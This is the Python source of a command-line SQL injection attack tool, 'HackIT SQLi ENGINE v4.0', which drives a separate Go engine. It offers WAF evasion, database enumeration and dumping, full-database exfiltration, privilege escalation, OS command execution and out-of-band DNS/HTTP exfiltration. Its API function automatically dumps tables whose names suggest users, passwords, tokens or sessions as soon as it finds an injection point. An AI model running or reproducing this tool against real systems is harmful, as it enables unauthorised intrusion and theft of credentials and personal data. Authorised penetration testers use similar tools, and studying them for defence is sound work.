"""
SQLi PENETRATION ENGINE v4.0 - Advanced SQL Injection Framework
"""
import click
import json
import sys
import io
from hackit.ui import _colored
from .go_bridge import GoEngine

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
from datetime import datetime

_console = Console()

if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

BANNER = """
[bold green]
       .---.        .-----------
      /     \\  __  /    ------
     / /     \\/  \\/ -----
    //|      \\  / -----
   // |       \\/ -----
  //  |      .  -----
 //   |    / \\  -----
//    |   /   \\  -----
|     |  /     \\  -----
|     | |       \\  ----
|     | |        \\  ---
|     | |         \\  -
\\_____|_|__________\\________________________________[/bold green]
[bold cyan]       \\   /         HACKIT SQLi ENGINE v4.0[/bold cyan]
[bold green]        \\_/[/bold green]          [!] [bold red]Unauthorized use of this tool is illegal;[/bold red]
[bold green]                                            [/bold green][bold yellow]use only with explicit permission from the target owner.[/bold yellow]
[bold yellow][!] Legal usage demands prior consent from the target;[/bold yellow]
[bold yellow]    developers assume no liability.[/bold yellow]
[bold]      997 Payloads | 16 DBMS | 6-Stage Scan | Multi-Engine[/bold]"""


def _draw_table(title, columns, rows, style="cyan"):
    if not rows:
        return
    t = Table(title=f"[bold {style}]{title}[/]", border_style=style,
              header_style=f"bold {style}", box=box.ROUNDED, expand=True, show_lines=True)
    for c in columns:
        t.add_column(c, style="white", no_wrap=False)
    for row in rows:
        t.add_row(*[str(c) for c in row])
    _console.print(t)


def _dbms_color(dbms):
    return {'MySQL': 'cyan', 'MariaDB': 'cyan', 'PostgreSQL': 'blue',
            'MSSQL': 'red', 'Oracle': 'magenta', 'SQLite': 'yellow',
            'ClickHouse': 'green', 'DuckDB': 'yellow', 'CockroachDB': 'blue',
            'Snowflake': 'white', 'BigQuery': 'cyan', 'Firebird': 'red',
            'Sybase': 'magenta', 'H2': 'yellow', 'NoSQL': 'green'}.get(dbms, 'white')


# Build Click Command with all options
def _make_sqli_command():
    """Create the test_sqli Click command with all options applied in correct order."""
    opts = [
        click.option('-u', '--url', required=True, help='Target URL'),
        click.option('--data', default=None, help='Raw POST body'),
        click.option('--cookie', default=None, help='Session cookies'),
        click.option('--header', multiple=True, help='Custom headers (e.g. X-Forwarded-For: 127.0.0.1)'),
        click.option('--agent', default='HackIT/4.0', help='Custom User-Agent'),
        click.option('--referer', default=None, help='Custom referer'),
        click.option('--method', default='GET', type=click.Choice(['GET','POST','PUT','PATCH']), help='HTTP method'),
        click.option('--timeout', default=10, type=int, help='Timeout (seconds)'),
        click.option('--proxy', default=None, help='Proxy URL'),
        click.option('--follow-redirect', is_flag=True, help='Follow redirects'),
        click.option('--mode', default='auto', type=click.Choice(['auto','boolean','time','error','union','stacked']), help='Injection mode'),
        click.option('--risk-level', default=1, type=click.IntRange(1,5), help='Risk level (1-5)'),
        click.option('--depth', default=2, type=int, help='Scan depth'),
        click.option('--threads', default=10, type=int, help='Concurrent workers'),
        click.option('--delay', default=0, type=int, help='Delay (ms)'),
        click.option('--randomize-case', is_flag=True, help='Randomize payload case'),
        click.option('--tamper', multiple=True, help='Tamper scripts'),
        click.option('--encode', type=click.Choice(['URL','double','base64']), help='Payload encoding'),
        click.option('--bypass-waf', is_flag=True, help='WAF evasion'),
        click.option('--stealth', is_flag=True, help='Stealth mode'),
        click.option('--fingerprint', is_flag=True, help='DB fingerprinting'),
        click.option('--banner-grab', is_flag=True, help='Extract banner'),
        click.option('--os-detect', is_flag=True, help='OS detection'),
        click.option('--waf-detect', is_flag=True, help='WAF detection'),
        click.option('--smart-diff', is_flag=True, help='Smart response diff'),
        click.option('--tech-detect', is_flag=True, help='Tech stack detection'),
        click.option('--list-dbs', '--dbs', 'list_dbs', is_flag=True, help='Enumerate databases'),
        click.option('--list-tables', '--tables', 'list_tables', is_flag=True, help='Enumerate tables'),
        click.option('--list-columns', '--columns', 'list_columns', is_flag=True, help='Enumerate columns'),
        click.option('--schema', is_flag=True, help='Dump schema only'),
        click.option('-D', '--db', 'database', help='Target database'),
        click.option('-T', '--table', 'table', help='Target table'),
        click.option('-C', '--column', 'column', help='Target column'),
        click.option('--dump', '--dump-table', 'dump_table', help='Dump table'),
        click.option('--dump-all', is_flag=True, help='Exfiltrate entire database'),
        click.option('--inject', is_flag=True, help='Auto injection'),
        click.option('--count-rows', is_flag=True, help='Count rows'),
        click.option('--search', help='Search keyword'),
        click.option('--priv-esc', is_flag=True, help='Privilege escalation'),
        click.option('--os-access', is_flag=True, help='OS command execution'),
        click.option('--exfil-dns', is_flag=True, help='OOB DNS exfiltration'),
        click.option('--exfil-http', is_flag=True, help='OOB HTTP exfiltration'),
        click.option('--no-color', is_flag=True, help='Disable colors'),
        click.option('--retry', default=3, type=int, help='Retry count'),
        click.option('--output-format', type=click.Choice(['json','csv','txt']), default='json', help='Output format'),
        click.option('--save', help='Save results to file'),
        click.option('-v', '--verbose', default=1, type=int, help='Verbosity (0-3)'),
    ]

    def impl(ctx, **kwargs):
        _execute_scan(**kwargs)

    # Apply options in reverse order (decorators work bottom-up)
    fn = impl
    for opt in reversed(opts):
        fn = opt(fn)
    fn = click.pass_context(fn)
    return click.command(context_settings=dict(help_option_names=['-h', '--help']))(fn)


test_sqli = _make_sqli_command()


def _execute_scan(**kwargs):
    _console.print(BANNER)

    url = kwargs.get('url')
    display = Table.grid(padding=(0, 2))
    display.add_column(style="bold", justify="right")
    display.add_column()
    display.add_row("Target", f"[cyan]{url}[/cyan]")
    display.add_row("Mode", f"[yellow]{kwargs.get('mode', 'auto').upper()}[/yellow]")
    display.add_row("Risk", f"{kwargs.get('risk_level', 1)}/5")
    display.add_row("Threads", f"{kwargs.get('threads', 10)}")
    display.add_row("Time", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    _console.print(Panel(display, title="[bold]Scan Configuration[/bold]", border_style="cyan"))
    _console.print()

    engine = GoEngine()
    if not engine.available:
        _console.print("[bold red][!] Go is not installed.[/bold red]")
        return

    if kwargs.get('inject'):
        kwargs['dump_all'] = True
        kwargs['fingerprint'] = True
        kwargs['banner_grab'] = True
        kwargs['os_detect'] = True

    with Progress(SpinnerColumn(spinner_name="dots"),
                  TextColumn("[bold cyan]{task.description}[/]"),
                  BarColumn(bar_width=40), transient=True, console=_console) as progress:
        task = progress.add_task("Probing with 800+ payloads & multi-stage detection...", total=None)
        results = engine.run(**kwargs)
        progress.update(task, description="Processing results...")

    if results and isinstance(results, list) and len(results) > 0 and 'error' in results[0]:
        _console.print(f"\n[bold red][!] Engine Error: {results[0]['error']}[/bold red]")
        return

    findings = [r for r in results if r.get('parameter') != "enumeration"]
    enums = [r for r in results if r.get('parameter') == "enumeration"]

    if findings:
        _console.print()
        vt = Table(title="[bold red]SQLi Vulnerability Report[/]", border_style="red",
                   box=box.ROUNDED_HEADER, show_lines=True)
        vt.add_column("#", style="dim", justify="right")
        vt.add_column("Parameter", style="cyan")
        vt.add_column("Type", style="yellow")
        vt.add_column("DBMS", style="green")
        vt.add_column("Confidence", style="magenta", justify="center")
        for i, r in enumerate(findings, 1):
            conf = r.get('confidence', 0.85)
            if conf >= 0.9:     sc = f"[bold green]{conf*100:.0f}%[/]"
            elif conf >= 0.7:   sc = f"[yellow]{conf*100:.0f}%[/]"
            else:               sc = f"[red]{conf*100:.0f}%[/]"
            vt.add_row(str(i), r.get('parameter','N/A'), r.get('type','N/A'),
                       f"[{_dbms_color(r.get('dbms','Unknown'))}]{r.get('dbms','Unknown')}[/]", sc)
        _console.print(vt)
        _console.print()

        summary = Table.grid(padding=(0, 2))
        summary.add_column(style="bold dim", justify="right")
        summary.add_column()
        summary.add_row("Parameters", str(len(set(r.get('parameter') for r in findings))))
        summary.add_row("Types", ", ".join(set(r.get('type','') for r in findings)))
        summary.add_row("DBMS", ", ".join(set(r.get('dbms','') for r in findings)))
        summary.add_row("Peak Confidence", f"[green]{max(r.get('confidence',0) for r in findings)*100:.0f}%[/]")
        _console.print(Panel(summary, title="[bold]Detections[/]", border_style="yellow"))
    else:
        _console.print("\n[bold green][✓] No SQL Injection vulnerabilities detected.[/bold green]")
        _console.print("[dim]  → Try --risk-level 5 for deeper scanning[/dim]")
        _console.print("[dim]  → Try --bypass-waf if a WAF is blocking[/dim]")

    if enums:
        _console.print()
        _console.print(Panel("[bold cyan]Database Enumeration Results[/]", border_style="cyan"))
        _console.print()
        for e in enums:
            etype = e.get('type')
            payload = e.get('payload', '')
            detail = e.get('details', '')
            items = [x.strip() for x in payload.split(',') if x.strip()]
            if etype == "list-dbs":
                _draw_table(f"Databases ({len(items)})", ["#","DATABASE"], [[i+1, x] for i,x in enumerate(items)], "cyan")
            elif etype == "list-tables":
                ctx_name = detail or kwargs.get('database', 'Current')
                _draw_table(f"Tables in [{ctx_name}] ({len(items)})", ["#","TABLE"], [[i+1, x] for i,x in enumerate(items)], "green")
            elif etype == "list-columns":
                _draw_table("Column Schema", ["#","COLUMN"], [[i+1, x] for i,x in enumerate(items)], "yellow")
            elif etype == "dump-table":
                _console.print()
                _console.print(Panel(f"[bold green]Data Dump[/]\n\n{payload[:5000]}", title=f"[bold]Table: {detail}[/]", border_style="green"))

    if findings and kwargs.get('risk_level', 0) >= 3:
        _console.print(Panel(
            "[bold yellow]Post-Exploitation Options:[/]\n"
            "  [cyan]--priv-esc[/]   Privilege escalation\n"
            "  [cyan]--os-access[/]   OS command execution\n"
            "  [cyan]--dump-all[/]    Complete database exfiltration\n"
            "  [cyan]--exfil-dns[/]   OOB DNS exfiltration\n"
            "  [cyan]--exfil-http[/]  OOB HTTP exfiltration",
            title="[bold]Advanced Options[/]", border_style="yellow"))

    if kwargs.get('save'):
        with open(kwargs['save'], 'w') as f:
            json.dump(results, f, indent=2, default=str)
        _console.print(f"\n[bold green][+] Report saved: {kwargs['save']}[/bold green]")

    if findings:
        _console.print(f"\n[bold red]⚠ {len(findings)} vulnerability(-ies) found.[/bold red]")
        _console.print("[dim]  → Use --dbs to enumerate databases[/dim]")
        _console.print("[dim]  → Use -D <db> --tables to list tables[/dim]")
        _console.print("[dim]  → Use -D <db> -T <table> --dump to extract data[/dim]")


def test_sqli_api(url):
    engine = GoEngine()
    if not engine.available or not engine.ensure_compiled():
        return {"error": "SQLi Engine (Go) not available"}
    try:
        results = engine.run(url=url, method='GET', timeout=10)
        formatted = []
        explorer = {"databases": [], "tables": {}, "sample_data": []}
        vuln_found = False
        for r in results:
            if r.get('parameter') != "enumeration":
                vuln_found = True
                conf = r.get('confidence', 0)
                formatted.append({
                    "param": r.get('parameter','N/A'), "type": r.get('type','N/A'),
                    "payload": r.get('payload','N/A'), "dbms": r.get('dbms','Unknown'),
                    "confidence": conf,
                    "severity": "CRITICAL" if conf >= 0.9 else "HIGH" if conf >= 0.7 else "MEDIUM"
                })
        if vuln_found:
            db_res = engine.run(url=url, list_dbs=True, timeout=15)
            for d in db_res:
                if d.get('type') == 'list-dbs':
                    explorer["databases"] = [s.strip() for s in d.get('payload','').split(',') if s.strip()]
            if explorer["databases"]:
                target_db = explorer["databases"][0]
                table_res = engine.run(url=url, list_tables=True, database=target_db, timeout=15)
                for t in table_res:
                    if t.get('type') == 'list-tables':
                        explorer["tables"][target_db] = [s.strip() for s in t.get('payload','').split(',') if s.strip()]
                for t_name in explorer["tables"].get(target_db, []):
                    if any(x in t_name.lower() for x in ['user','admin','account','member','staff','credential','customer','employee','person','login','passwd','secret','token','session']):
                        dump_res = engine.run(url=url, dump_table=t_name, database=target_db, timeout=20)
                        for dr in dump_res:
                            if dr.get('type') == 'dump-table':
                                try:
                                    explorer["sample_data"].append(json.loads(dr.get('payload','{}')))
                                except:
                                    explorer["sample_data"].append({"raw": dr.get('payload','')})
                        break
        return {"findings": formatted, "explorer": explorer, "vuln": vuln_found}
    except Exception as e:
        return {"error": str(e)}


if __name__ == "__main__":
    test_sqli()
